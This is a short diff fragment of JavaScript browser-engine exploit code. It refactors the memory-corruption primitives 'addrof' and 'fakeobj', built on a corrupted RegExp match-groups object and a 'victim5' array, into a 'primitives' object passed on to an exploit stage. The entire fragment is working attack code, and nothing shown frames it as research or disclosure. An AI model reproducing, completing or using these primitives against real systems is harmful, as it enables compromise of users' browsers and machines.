@@ -118,21 +118,20 @@ match.groups.oolProperty1 = objY;       // This property overlaps with oolProper
 global = match;
 // backup original structure
 let backup = hax(1);
-let addrof = function (obj) {
+var primitives = {
+ addrof: function (obj) {
   hax(backup);
   victim5[0] = obj;
   hax(i2jsv(0x0108211700001000));
   return victim5[2];
-}
-let fakeobj = function (addr) {
+},
+fakeobj: function (addr) {
   hax(i2jsv(0x0108211700001000));
     victim5[2] = addr;
     hax(backup);
   return victim5[0];
-}
-var primitives;
-primitives.addrof = addrof();
-primitives.fakeobj = fakeobj();
+}};
+
 let stage1 = primitives;
 /*
 var structs = [];
